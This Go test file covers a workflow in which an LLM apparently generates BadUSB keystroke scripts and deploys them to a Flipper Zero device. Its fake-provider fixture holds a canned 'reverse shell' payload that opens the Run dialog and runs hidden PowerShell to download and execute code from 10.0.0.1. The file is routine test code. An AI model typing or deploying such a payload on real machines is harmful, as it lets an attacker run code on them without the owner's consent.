//go:build linux

package workflows_test

import (
	"context"
	"encoding/json"
	"strings"
	"testing"

	"github.com/xunholy/promptzero/internal/flipper/mock"
	"github.com/xunholy/promptzero/internal/generate"
	"github.com/xunholy/promptzero/internal/provider"
	"github.com/xunholy/promptzero/internal/workflows"
)

// fakeProvider is a minimal provider.Provider stub that echoes back a
// canned payload. Used so BadUSB generation returns deterministic output
// without hitting a real LLM.
type fakeProvider struct {
	content string
}

func (f *fakeProvider) Name() string { return "fake" }
func (f *fakeProvider) Complete(ctx context.Context, system string, messages []provider.Message) (*provider.Response, error) {
	return &provider.Response{Content: f.content}, nil
}

// TestBadUSBTargetProfileGenerateDeploy drives the two-phase happy path
// (generate → deploy) without auto_run. We assert the deploy phase
// wrote the generated script to the default path and the result
// surfaces the preview + script length.
func TestBadUSBTargetProfileGenerateDeploy(t *testing.T) {
	if testing.Short() {
		t.Skip("slow; full composite workflow — rerun without -short")
	}
	f, _ := mockFlipper(t,
		// `storage mkdir` + `storage write_chunked` both land on the
		// `storage` head. An empty reply plus the prompt keeps the
		// underlying Flipper.StorageWrite / StorageMkdir returning nil.
		mock.WithHandler("storage", func(args []string) string { return "" }),
	)
	llm := &fakeProvider{content: `REM reverse shell payload
DELAY 500
GUI r
DELAY 300
STRING powershell -w h -c "iwr 10.0.0.1/s|iex"
ENTER`}
	gen := generate.New(llm, f)

	params := map[string]interface{}{
		"description": "open a reverse shell to 10.0.0.1",
		"target_os":   "windows",
	}
	out, err := workflows.BadUSBTargetProfile(context.Background(),
		workflows.Deps{Flipper: f, Generator: gen}, params)
	if err != nil {
		t.Fatalf("BadUSBTargetProfile: %v", err)
	}

	var got map[string]interface{}
	if err := json.Unmarshal([]byte(out), &got); err != nil {
		t.Fatalf("result is not JSON: %v\n%s", err, out)
	}

	summary, _ := got["summary"].(string)
	if !strings.Contains(summary, "windows") {
		t.Errorf("summary missing target OS: %q", summary)
	}
	if !strings.Contains(summary, "deployed") {
		t.Errorf("summary missing 'deployed': %q", summary)
	}

	if path, _ := got["path"].(string); !strings.HasPrefix(path, "/ext/badusb/") {
		t.Errorf("expected default /ext/badusb path, got %q", path)
	}

	phases, _ := got["phases"].([]interface{})
	// generate + deploy = 2 phases; no run since auto_run=false.
	if len(phases) != 2 {
		t.Errorf("expected 2 phases, got %d", len(phases))
	}
}

// TestBadUSBTargetProfileMissingDescription verifies the param-guard
// path: missing description returns a friendly error without calling
// the LLM.
func TestBadUSBTargetProfileMissingDescription(t *testing.T) {
	f, _ := mockFlipper(t)
	gen := generate.New(&fakeProvider{content: "unused"}, f)

	out, err := workflows.BadUSBTargetProfile(context.Background(),
		workflows.Deps{Flipper: f, Generator: gen},
		map[string]interface{}{"target_os": "linux"})
	if err != nil {
		t.Fatalf("BadUSBTargetProfile: %v", err)
	}
	var got map[string]interface{}
	if err := json.Unmarshal([]byte(out), &got); err != nil {
		t.Fatalf("result is not JSON: %v", err)
	}
	summary, _ := got["summary"].(string)
	if !strings.Contains(summary, "description is required") {
		t.Errorf("expected description-required error, got %q", summary)
	}
}
